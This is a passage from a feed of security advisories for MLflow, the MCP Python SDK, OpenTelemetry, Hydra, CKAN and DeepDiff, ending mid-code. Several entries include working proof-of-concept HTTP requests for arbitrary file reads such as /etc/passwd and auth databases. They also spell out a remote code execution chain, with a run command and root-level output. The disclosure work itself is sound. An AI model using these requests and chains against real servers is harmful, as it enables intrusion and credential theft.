items.content_html:
Summary

On MLflow tracking servers running without authentication, which is the default for mlflow server, a remote attacker can read arbitrary files from the server’s filesystem by creating a model version tagged as a prompt whose source is a schemeless local path.

The fix for CVE-2026-2614 in 3.10.0 added a prompt-specific branch to the CreateModelVersion handler that rejects file:// URIs and absolute paths but runs path validation only when the source carries a URL scheme. A schemeless value such as ../../etc, a plain relative name, ., a percent-encoded path, or a Windows drive-letter path is therefore stored unchanged as the model version’s artifact location, and the model-versions/get-artifact endpoint later serves files from it with the privileges of the server process. The tag check also keyed on the presence of the mlflow.prompt.is_prompt tag rather than its value, so a false value still selected the weaker branch.

Servers using --app-name basic-auth are also affected: any authenticated user can create a registered model, so a low-privilege account can use this to read the authentication database, including the admin password hash.

Affected: MLflow 3.10.0 through 3.16.1. Fixed in 3.17.0 by mlflow/mlflow#25870, which accepts only MLflow’s own placeholder sources for prompt versions and requires the prompt tag to be true.

Details

When creating a model version with the mlflow.prompt.is_prompt tag set to true, the request is handled by the prompt branch in _create_model_version().

mlflow/server/handlers.py:2674-2690:

is_prompt = _is_prompt_request(request_message)
if is_prompt:
    source = request_message.source
    parsed = urllib.parse.urlparse(source)
    if parsed.scheme == "file" or (parsed.scheme == "" and source.startswith("/")):
        raise MlflowException(...)
    if parsed.scheme:
        _validate_non_local_source_contains_relative_paths(source)
else:
    if request_message.model_id:
        _validate_source_model(request_message.source, request_message.model_id)
    else:
        _validate_source_run(request_message.source, request_message.run_id)

The prompt branch does not call _validate_source_run(), _validate_source_model(), or _validate_non_local_source_contains_relative_paths() for schemeless relative paths.

The artifact-read sink later trusts the stored source:

mlflow/server/handlers.py:2765-2782:

def get_model_version_artifact_handler():
    name = request.args.get("name")
    version = request.args.get("version")
    path = request.args["path"]
    path = validate_path_is_safe(path)
    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)
    ...
    else:
        artifact_repo = get_artifact_repository(artifact_uri)
        artifact_path = path

    return _send_artifact(artifact_repo, artifact_path)

_send_artifact() calls artifact_repository.download_artifacts(path) and serves the resulting local file with send_file().

PoC

Prerequisite: A reachable MLflow tracking server with model registry endpoints enabled.

  1. Create a sentinel file on the server:
printf 'MLFLOW_PWNED_SENTINEL_REPORT' > /tmp/sentinel-mlflow.txt
  1. Send the following requests to the MLflow server to exploit the traversal:

First, create a registered model:

POST /api/2.0/mlflow/registered-models/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{"name": "pwned-model"}

Next, create a prompt-tagged model version with the malicious relative source ../../../tmp:

POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{
  "name": "pwned-model",
  "source": "../../../tmp",
  "tags": [{"key": "mlflow.prompt.is_prompt", "value": "true"}]
}

Finally, retrieve the arbitrary file via the artifact download endpoint by supplying the target filename in the path parameter:

GET /api/2.0/mlflow/model-versions/get-artifact?name=pwned-model&version=1&path=sentinel-mlflow.txt HTTP/1.1
Host: 127.0.0.1:5000

This returns the contents of /tmp/sentinel-mlflow.txt. The same primitive can read sensitive files like /etc/passwd or tracking databases (e.g. mlflow.db).

Impact

Direct impact is arbitrary local file read as the MLflow server process. Confirmed read targets include:

  • /etc/passwd
  • SQLite tracking databases readable by the process (e.g., mlflow-auth.db or basic_auth.db)
  • Environment variables or configurations stored on disk
  • /home/user/.bash_history

Threat model: An attacker who can reach the MLflow tracking server HTTP port can read arbitrary files readable by the MLflow server process. On unauthenticated MLflow deployments, this is directly exploitable without credentials. On auth-enabled deployments, any authenticated user (even low-privileged or "read-only" accounts, depending on default RBAC configurations allowing model creation) can use the primitive. Leaked credential stores may enable offline password attacks or broader administrative compromise.

References

  • https://github.com/mlflow/mlflow/security/advisories/GHSA-m65p-9j7q-6w33
  • https://github.com/mlflow/mlflow/pull/25870
  • https://github.com/mlflow/mlflow/commit/81730a2ce4ebcd60d5d18f68c96f422ad7e30772
  • https://github.com/mlflow/mlflow/releases/tag/v3.17.0
  • https://github.com/advisories/GHSA-m65p-9j7q-6w33

items.content_html:
Summary

mlflow.crewai.autolog() leaks CrewAI LLM provider API keys into MLflow trace telemetry.

When a CrewAI Agent is instrumented with MLflow autologging, MLflow serializes the agent's __dict__ and converts its fields to strings. The llm field contains the CrewAI LLM object, whose string representation includes its api_key in plaintext.

As a result, an application that calls mlflow.crewai.autolog() can unintentionally send its LLM provider API key to the MLflow trace backend or configured OTLP destination.

The application does not need to explicitly log the credential or place it in a span attribute. The credential is extracted automatically by MLflow's instrumentation.

This was verified on MLflow 3.16.0 with CrewAI 1.15.18 using MLflow's own OTLP exporter. The fake credential appeared in 5 attribute locations across 2 spans.

Details

The primary issue is in:

mlflow/crewai/autolog.py::_get_agent_attributes()

The function walks the CrewAI Agent.__dict__ and converts agent fields to strings. tools and embedder receive special handling, but credential-bearing objects such as the following are not sanitized:

  • llm
  • function_calling_llm
  • agent_executor
  • crew

For example, agent.llm is a CrewAI LLM object. In CrewAI 1.15.18, the underlying LLM model contains api_key as a normal field. Its string representation therefore contains the credential:

llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-...' ...

MLflow subsequently stores this string as a span attribute.

There is an important indication that this is an unintended disclosure: MLflow's dedicated LLM attribute extraction already explicitly excludes api_key in _get_llm_attributes(). The LLM span therefore does not expose the credential, while the broader Agent __dict__ serialization bypasses that protection.

There is also a second, independent serialization path in:

mlflow/crewai/autolog.py::_construct_full_inputs()

This code uses:

v.__dict__ if hasattr(v, "__dict__") else v

on call arguments. During CrewAI execution, the Agent object is passed as an argument, causing its __dict__ to be expanded and the credential-bearing LLM object to be included in mlflow.spanInputs.

Therefore, there are two independent leakage paths:

  1. Agent span attributes through _get_agent_attributes()
  2. Span inputs through _construct_full_inputs()

Fixing only the Agent attribute serialization would leave the mlflow.spanInputs path vulnerable.

A safer approach would be to avoid recursively serializing arbitrary object __dict__ values. Agent telemetry should use an explicit allowlist of non-sensitive scalar fields, and credential-bearing objects such as llm, function_calling_llm, agent_executor, and crew should either be reduced to safe metadata or omitted.

Similarly, _construct_full_inputs() should not automatically expand arbitrary objects through __dict__, or the resulting values should pass through the same sanitization mechanism before being attached to a span.

PoC

Environment:

MLflow: 3.16.0
CrewAI: 1.15.18
Python: 3.12.3
opentelemetry-exporter-otlp-proto-http: 1.42.1

1. Direct serialization proof

The following demonstrates the vulnerability without starting a Crew, making a network request, or requiring an MLflow server:

import importlib
from crewai import LLM, Agent

autolog = importlib.import_module("mlflow.crewai.autolog")

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="r",
    goal="g",
    backstory="b",
    llm=llm,
)

attrs = autolog._get_agent_attributes(agent)

assert "sk-proj-EXAMPLE1234567890" in attrs["llm"]

print(attrs["llm"])

The output contains the API key in plaintext, for example:

llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-EXAMPLE1234567890' ...

No provider request is required.

2. End-to-end trace disclosure

The issue can also be reproduced through MLflow's actual OTLP exporter.

Configure a local OTLP HTTP receiver and set:

export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://127.0.0.1:4318/v1/traces
export OTEL_EXPORTER_OTLP_TRACES_PROTOCOL=http/protobuf
export CREWAI_DISABLE_TELEMETRY=true

Then run:

import mlflow

from crewai import Agent, Crew, LLM, Task

mlflow.crewai.autolog()

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="Support Responder",
    goal="Answer support questions",
    backstory="A support agent",
    llm=llm,
)

task = Task(
    description="Answer the user's question",
    expected_output="A response",
    agent=agent,
)

crew = Crew(
    agents=[agent],
    tasks=[task],
)

crew.kickoff()

A local OTLP receiver can decode the ExportTraceServiceRequest sent by MLflow.

The provider request is expected to fail because the credential is intentionally fake. This does not affect the vulnerability: the sensitive value is added to the MLflow span when the instrumentation starts, before the provider call succeeds or fails.

In the tested environment, the fake API key appeared in the exported telemetry in 5 locations across 2 spans, including:

Support Responder
  attributes.llm
  attributes.function_calling_llm
  attributes.agent_executor
  attributes.mlflow.spanInputs

Task.execute_sync
  attributes.mlflow.spanInputs

The captured value is produced by MLflow's actual telemetry/export path rather than being manually inserted into a span.

All credentials used in the reproduction are locally generated fake values. No real API credential is required.

Impact

Type: Sensitive Information Disclosure / Credential Disclosure CWE: CWE-532 — Insertion of Sensitive Information into Log File

Any application using mlflow.crewai.autolog() with a CrewAI LLM configured with an API key can unintentionally disclose that credential through MLflow traces.

The credential is written to trace telemetry even though the application does not explicitly log it.

Anyone with access to the MLflow trace storage or configured OTLP destination may therefore obtain the provider credential. Depending on the deployment, this can include MLflow users, observability operators, or third-party telemetry providers.

The leaked credential can then potentially be used against the corresponding LLM provider account, including for unauthorized API usage and associated costs.

The issue is particularly significant because the credential crosses a trust boundary: a provider API key intended for use by the application is automatically copied into observability telemetry where a broader set of users or systems may have access.

The vulnerability does not require the developer to intentionally log the secret. The only relevant prerequisite is enabling the CrewAI autologging integration.

Patches

Fixed in MLflow 3.17.0 by #25845. mlflow.crewai.autolog() now reduces CrewAI LLM objects to their model name and drops credential-like keys before they are written to span attributes or mlflow.spanInputs.

Remediation

  • Upgrade to mlflow>=3.17.0.
  • Upgrading stops new leakage but does not remove credentials already written. Rotate any LLM provider key that a CrewAI LLM object held (for example one passed as LLM(api_key=...)) while mlflow.crewai.autolog() was enabled on MLflow 2.19.0 through 3.16.x.
  • Delete or redact the affected traces in the MLflow tracking backend and in any OTLP destination they were exported to. The key appears in Agent and Crew span attributes and in mlflow.spanInputs.

Workarounds

If you cannot upgrade yet, disable CrewAI autologging with mlflow.crewai.autolog(disable=True).

References

  • https://github.com/mlflow/mlflow/security/advisories/GHSA-j7qq-vr8c-xvw3
  • https://github.com/mlflow/mlflow/pull/25845
  • https://github.com/mlflow/mlflow/commit/20927930d27f0072fcfeb7f024f24ad8c5e77c47
  • https://github.com/mlflow/mlflow/releases/tag/v3.17.0
  • https://github.com/advisories/GHSA-j7qq-vr8c-xvw3

items.content_html:
Summary

MLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously.

An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints:

  1. Create an experiment whose local artifact location points to a writable allowed scorer package.
  2. Create a run, causing MLflow to allocate <artifact_location>/<run_id>/artifacts/.
  3. Upload a Python module into that run artifact directory.
  4. Submit a serialized third-party scorer whose module path resolves to the uploaded file.
  5. Trigger server-side import and class construction through /ajax-api/3.0/mlflow/scorer/invoke.

On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree.

The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match.

Technical details

1. The allow-list accepts attacker-created descendants

At release commit 86cd7f5a1dc25a1387ad07c87811bbc30f62951c, mlflow/genai/scorers/scorer_utils.py defines these allowed roots:

THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({
    "mlflow.genai.scorers.ragas",
    "mlflow.genai.scorers.deepeval",
    "mlflow.genai.scorers.trulens",
    "mlflow.genai.scorers.phoenix",
})

In mlflow/genai/scorers/base.py, the deserializer accepts either an exact root or any descendant:

module_path == m or module_path.startswith(m + ".")

It then performs the following operations using request-controlled values:

module = importlib.import_module(module_path)
scorer_class = getattr(module, class_name, None)
scorer_instance = scorer_class(**init_kwargs)

A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code.

Relevant source locations at the v3.14.0 release commit:

  • mlflow/genai/scorers/scorer_utils.py, allowed third-party scorer modules
  • mlflow/genai/scorers/base.py, third-party scorer deserialization and construction

2. Deserialization occurs before trace processing

In mlflow/server/handlers.py, _invoke_scorer_handler() parses the supplied serialized scorer and calls:

scorer = Scorer.model_validate_json(serialized_scorer)

Only after deserialization and construction does the handler call:

batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store)

The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs.

The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof.

No background job execution or special job-execution server option is required to reach the constructor.

3. MLflow's artifact layout places the module under the trusted prefix

The experiment creation endpoint accepts an artifact_location. For file-backed experiments, MLflow derives each run artifact directory as:

<artifact_location>/<run_id>/artifacts/

The proof of concept selects this package directory in the official v3.14.0 image:

file:///usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens

After creating a run and uploading audit_<token>.py, the resulting filesystem location is:

/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/<run_id>/artifacts/audit_<token>.py

The corresponding import path is:

mlflow.genai.scorers.trulens.<run_id>.artifacts.audit_<token>

The attack does not overwrite an existing package module. It creates a new run-scoped module in the normal file-backed artifact layout. The run ID is returned to the caller.

4. Authentication and authorization behavior

With authentication disabled, as in the default reproduced server configuration, no credentials are required.

When MLflow basic authentication is enabled, authentication still applies. However, the scorer-invocation AJAX endpoint is assigned to validate_gateway_proxy, which returns True without performing an experiment- or scorer-level resource permission check.

Practical exploitation in an authenticated deployment still requires the caller to create an experiment and run and upload artifacts to them. The key authorization issue is that scorer deserialization itself is not gated by a resource-specific permission check for the supplied experiment before the import occurs.

Proof of concept

The attached reproduction is intentionally isolated:

  • exact official MLflow v3.14.0 image pinned by manifest digest;
  • Docker network disabled;
  • MLflow bound to container loopback;
  • no shell command or external callback;
  • no external request;
  • no host filesystem write;
  • marker created beside the uploaded run artifact;
  • marker retrieved through the run-artifact download endpoint; and
  • disposable container removed after completion.

Run:

./run-official-image.sh

Expected output:

MLFLOW_VERSION=3.14.0
PACKAGE_DIR=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens
CREATE_EXPERIMENT_STATUS=200
CREATE_RUN_STATUS=200
UPLOAD_STATUS=200
INVOKE_STATUS=500
PROOF_DOWNLOAD_STATUS=200
PROOF_MATCH=1
RESULT=AFFECTED

The security-relevant result is:

PROOF_MATCH=1
RESULT=AFFECTED

This proves that the attacker-controlled constructor executed in the MLflow server process before the later scorer-processing failure.

Reproduction environment

  • Release: MLflow v3.14.0
  • Release commit: 86cd7f5a1dc25a1387ad07c87811bbc30f62951c
  • Official image: ghcr.io/mlflow/mlflow:v3.14.0
  • Manifest digest: sha256:967de3ca34b6a5751718e380a0a383eb0ce1a6f5b484f363bd0da7559117a5f8
  • Python version: 3.10.18
  • Image-configured user: empty
  • Observed runtime user: uid 0
  • Server bind: 127.0.0.1:5000
  • Container network: disabled
  • Backend store: sqlite:////work/mlflow.db
  • Default artifact root: /work/artifacts
  • Authentication: disabled
  • Special job-execution option: none

Server command inside the disposable container:

mlflow server \
  --host 127.0.0.1 \
  --port 5000 \
  --backend-store-uri sqlite:////work/mlflow.db \
  --default-artifact-root /work/artifacts

Affected range and source lineage

The vulnerable third-party scorer deserialization behavior was introduced by commit:

02eea26035b9d8e65af31e6e8f058ca195f62cdd
Enable third-party scorer registration in OSS MLflow (#22634)

The feature is absent from v3.11.1 and first appears in v3.12.0.

Runtime reproduction succeeds on v3.14.0. The relevant mlflow/genai/scorers/base.py content is unchanged at master commit:

20858c9426a9644dfcf9545a92cbb534376779eb

No fixed release was identified as of 2026-07-12.

Impact

On the reproduced stock no-auth image, any network caller who can reach the tracking server can execute Python code as the MLflow process without credentials or user interaction.

Successful exploitation provides confidentiality, integrity, and availability impact over all data, credentials, network access, and filesystem locations available to the MLflow server process.

The stock image's runtime uid 0 increases container-level impact. Host impact still depends on the container runtime configuration, mounted paths, granted capabilities, socket exposure, and other isolation controls.

In authentication-enabled deployments, exploitation requires an authenticated principal capable of creating an experiment and run and uploading artifacts. The exact chain also requires the server process to be able to write beneath one of the allowed scorer packages. This condition holds in the reproduced official image and may hold in virtual environments installed and run by the same operating-system user.

A read-only container filesystem or a scorer package directory owned by a different, non-writable user blocks this exact placement chain.

Artifacts and attachments

Remote proof-of-concept script

POC Script: new_remote_poc.py

The remote proof of concept was then executed as follows. The disposable machine’s public IP has been redacted:

python3 new_remote_poc.py \
  --target http://<REDACTED_PUBLIC_IP> \
  --package-dir /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens \
  --acknowledge-owned-target I_OWN_THIS_TARGET

The complete sanitized output was:

VERSION_STATUS=200
MLFLOW_VERSION=3.14.0
CREATE_EXPERIMENT_STATUS=200
EXPERIMENT_ID=2
CREATE_RUN_STATUS=200
RUN_ID=9a2d665eb38940b68983f0586f623115
UPLOAD_STATUS=200
IMPORT_PATH=mlflow.genai.scorers.trulens.9a2d665eb38940b68983f0586f623115.artifacts.audit_1783843760683972103
INVOKE_STATUS=500
INVOKE_RESPONSE_PREVIEW='<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n'
PROOF_DOWNLOAD_STATUS=200
EXPECTED_MARKER_SHA256=7a423b479df3524567fdf8cc3e7f6c4bfccc577fbcc4bac9519db8bd1cc61ed5
PROOF_MATCH=1
SERVER_CLEANUP_PATH=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115
PROOF_OUTPUT_BEGIN
{
  "cwd": "/",
  "machine": "x86_64",
  "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103",
  "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n",
  "platform": "Linux-7.0.0-1006-aws-x86_64-with-glibc2.31",
  "python_implementation": "CPython",
  "python_version": "3.10.18",
  "server_datetime_utc": "2026-07-12T08:09:43.555055+00:00",
  "whoami": "root",
  "whoami_returncode": 0,
  "whoami_stderr": ""
}
PROOF_OUTPUT_END

EXPERIMENT_METADATA_CLEANUP_STATUS=200

The proof file was also verified directly inside the disposable container:

cat /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115/artifacts/execution-proof-1783843760683972103.json

The file contained:

{
  "cwd": "/",
  "machine": "x86_64",
  "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103",
  "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n",

  "python_implementation": "CPython",
  "python_version": "3.10.18",

  "whoami": "root",
  "whoami_returncode": 0,
  "whoami_stderr": ""

The results demonstrate that:

  • the attacker-controlled module was uploaded beneath an allowed scorer package;
  • MLflow imported the request-selected module and invoked its constructor;
  • the constructor executed as the MLflow server process, which ran as root in the reproduced official image;
  • the constructor created a server-side proof file containing a random marker and bounded runtime information;
  • the proof file was retrieved successfully through MLflow’s artifact-download endpoint; and
  • the later HTTP 500 occurred only after constructor execution.

The authoritative reproduction indicators are:

PROOF_MATCH=1
RESULT=AFFECTED

The disposable cloud machine and container were removed after testing.

items.content_html:
Summary

In affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.

Am I affected?

Yes, if your HTTP server uses the SDK's bearer authentication (auth=AuthSettings(...) with token_verifier=), its authorization server also issues tokens for other services, and your TokenVerifier does not check the token's audience (aud) itself.

Affected versions:

  • mcp 1.10.0 through 1.29.1
  • mcp 2.0.0 through 2.1.1

Fix

Upgrade to:

  • 1.x: mcp 1.30.0 or later
  • 2.x: mcp 2.2.0 or later

Upgrading alone changes nothing. The patched versions add a validate_token_resource setting that is off unless you set it. To turn the check on, make both of these changes together:

Summary

JaegerPropagator.extract() in opentelemetry-propagator-jaeger did not enforce limits when extracting inbound uberctx-* baggage headers. Attacker-controlled baggage could cause unnecessary CPU work and short-lived heap allocations while processing more data than the propagator should accept.

Impact

Services that enable the optional Jaeger propagator and accept untrusted inbound propagation headers may experience increased per-request resource usage. This can contribute to denial-of-service risk when transport-level limits are absent or configured above the baggage limits.

The practical impact for most Python web deployments is limited. The package must be installed separately, and the Jaeger propagator is not enabled by the default OpenTelemetry Python configuration.

Common Python web servers also constrain request headers before they reach the propagator:

  • Gunicorn allows a maximum of 100 request-header fields and 8,190 bytes per field by default.
  • Uvicorn’s h11 implementation limits its incomplete-event buffer to 16,384 bytes by default.

The risk is higher for non-HTTP transports, custom TextMapGetter implementations, or deployments where server and gateway limits have been increased or disabled.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

Patches

Versions of opentelemetry-propagator-jaeger earlier than 1.45.0 are affected.

Upgrade opentelemetry-propagator-jaeger to version 1.45.0 or later.

Version 1.45.0 limits extraction to 180 entries and 8,192 total bytes and skips entries larger than 4,096 bytes.

Summary

In affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:

  • custom headers set on the client (for example an X-API-Key credential) were sent to that origin, and
  • on a 307 or 308 redirect the request body was re-sent there too.

The SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.

A lone Authorization bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.

Anyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.

Am I affected?

Yes, if your code uses the SDK as an MCP client over HTTP through any of:

  • streamable_http_client (on 2.x also Client given an http:// or https:// URL)
  • streamablehttp_client or sse_client
  • ClientSessionGroup with HTTP server parameters
  • the internal create_mcp_http_client helper

This includes an HTTP client you passed in yourself with follow_redirects=True.

Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected:

  • MCP servers
  • stdio clients
  • a client you supplied with follow_redirects left at its default of False

Fix

Upgrade to mcp 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.

The transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an http to https upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (MCPError on 2.x, httpx.HTTPStatusError on 1.x), whichever HTTP client the transport uses. The internal create_mcp_http_client helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.

If your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.

Until you can upgrade, supply your own HTTP client with follow_redirects left at False (http_client= on streamable_http_client; httpx_client_factory= on sse_client and streamablehttp_client; ClientSessionGroup has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.

If you genuinely need the old behaviour (unsupported)

This restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on 307/308, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:

import httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead

class FollowRedirectsAnyway(httpx2.AsyncClient):
    """Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection."""

    async def send(self, request, *, follow_redirects=False, **kwargs):
        return await super().send(request, follow_redirects=True, **kwargs)

http_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300))
# streamable_http_client(url, http_client=http_client)

# sse_client / streamablehttp_client take a factory instead:
def client_factory(headers=None, timeout=None, auth=None):
    return FollowRedirectsAnyway(headers=headers, auth=auth,
                                 timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300))
# sse_client(url, httpx_client_factory=client_factory)

The redirect handling is then the HTTP library's own, as before the fix: a lone Authorization header is still dropped on cross-origin hops and 301/302/303 become GET. It is not something the SDK supports or tests.

items.content_html:
Summary

In affected versions, when a connected MCP server declared an outputSchema for a tool, the SDK's client validated each call_tool result with jsonschema's default resolver, which fetches any $ref it cannot resolve locally by opening the URL. A server could therefore put an http://, https:// or file:// reference in a tool's output schema and make the client:

  • request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and
  • stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.

Am I affected?

Yes, if your application uses the SDK as an MCP client (ClientSession over any transport, ClientSessionGroup, or the 2.x Client) and calls tools on servers you do not fully control. There was no setting that turned the validation off.

Affected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected: applications that only build servers. If nothing in your code uses ClientSession, ClientSessionGroup or the 2.x Client class, you are not affected.

Fix

Upgrade to mcp 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with RuntimeError (Invalid schema for tool ...); in-document references such as #/$defs/... work as before.

Until you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose outputSchema contains an $id, or a $ref / $dynamicRef that does not start with #.

Summary

Hydra's legacy target blacklist omits PyYAML's unsafe loading surfaces. If an application passes attacker-controlled targets and arguments to instantiate(), a target such as yaml.unsafe_load can execute Python code through a config-controlled YAML stream containing Python object-construction tags.

Impact and prerequisites

The attacker must control the relevant target and arguments that the application instantiates. The configured callable executes with the application's process privileges. This is a gap in the best-effort legacy blacklist. It is not a bypass of Hydra 1.4's execution whitelist supplied by trusted Python code.

One realistic exposure is a model downloaded from a third-party repository, such as Hugging Face, that bundles attacker-controlled configuration. When a victim loads the model using application code that passes this configuration to legacy Hydra instantiation without effective target restrictions, the model's metadata can execute code in the victim process. This model-loading attack pattern is documented in the original Hydra advisory GHSA-2cp2-2r3c-7p7r and the associated Unit 42 research. It does not imply that all Hugging Face models or currently patched downstream loaders are affected.

Hydra 1.3's blacklist is defense in depth, not a complete security boundary. Hydra 1.4 is affected on its deprecated no-whitelist legacy path. Installed application wrappers can perform indirect operations beyond a name-based blacklist's coverage; this fix does not make arbitrary configuration safe.

The unsafe_load finding is directly reproduced. PyYAML 6.0.3 full_load rejects the demonstrated python/object/apply payload, so the finding does not claim that all PyYAML loading APIs execute that payload.

Remediation

The fix blocks the yaml. target namespace except for the exact yaml.safe_load, yaml.safe_load_all, yaml.safe_dump, and yaml.safe_dump_all functions. Loader classes, constructor registration, general dump/load APIs, and other targets in the namespace remain blocked. Existing canonical-identity checks also cover aliases. The fix preserves Hydra 1.4's explicit unsafe opt-out for trusted use.

Workarounds

Do not pass untrusted configuration to instantiate() or call(). For Hydra 1.4, supply a narrow execution whitelist from trusted Python code. Do not let untrusted configuration select its own execution policy or opt out of checks.

Affected releases

The reported incomplete-remediation stable range is hydra-core 1.3.6 through 1.3.7. The 1.4 prerelease legacy path is also affected, including 1.4.0.dev9, 1.4.0.dev10, 1.4.0rc1, and 1.4.0rc2. The related blacklist advisory GHSA-rqx7-p7vv-w7hr was first patched in 1.3.6 and 1.4.0.dev9; these ranges describe the remaining omission after that remediation.

Specific vulnerabilities:

  • Arbitrary file write in resource_create and package_update actions, using the ResourceUploader object. Also reachable via package_create, package_revise, and package_patch via calls to package_update.
  • Remote code execution via unsafe pickle loading, via Beaker's session store when configured to use the file session store backend.
  • Potential DOS due to lack of a length check on the resource id.
  • Information disclosure: A user with permission to create a resource can access any other resource on the system if they know the id, even if they don't have access to it.
  • Resource overwrite: A user with permission to create a resource can overwrite any resource if they know the id, even if they don't have access to it.

Impact

A user with permissions to create or edit a dataset can upload a resource with a specially crafted id to write the uploaded file in an arbitrary location. This can be leveraged to Remote Code Execution via Beaker's insecure pickle loading.

Patches

All the above listed vulnerabilities have been fixed in CKAN 2.9.9 and CKAN 2.10.1 The patches for CKAN 2.9 should apply easily to previous CKAN versions.

Summary

Python class pollution is a novel vulnerability categorized under CWE-915. The Delta class is vulnerable to class pollution via its constructor, and when combined with a gadget available in DeltaDiff itself, it can lead to Denial of Service and Remote Code Execution (via insecure Pickle deserialization).

The gadget available in DeepDiff allows deepdiff.serialization.SAFE_TO_IMPORT to be modified to allow dangerous classes such as posix.system, and then perform insecure Pickle deserialization via the Delta class. This potentially allows any Python code to be executed, given that the input to Delta is user-controlled.

Depending on the application where DeepDiff is used, this can also lead to other vulnerabilities. For example, in a web application, it might be possible to bypass authentication via class pollution.

Details

The Delta class can take different object types as a parameter in its constructor, such as a DeltaDiff object, a dictionary, or even just bytes (that are deserialized via Pickle).

When it takes a dictionary, it is usually in the following format:

Delta({"dictionary_item_added": {"root.myattr['foo']": "bar"}})

Trying to apply class pollution here does not work, because there is already a filter in place: https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L23

However, this code only runs when parsing the path from a string. The _path_to_elements function helpfully returns the given input if it is already a list/tuple: https://github.com/seperman/deepdiff/blob/b639fece73fe3ce4120261fdcff3cc7b826776e3/deepdiff/path.py#L52-L53

This means that it is possible to pass the path as the internal representation used by Delta, bypassing the filter:

Delta(
    {
        "dictionary_item_added": {
            (
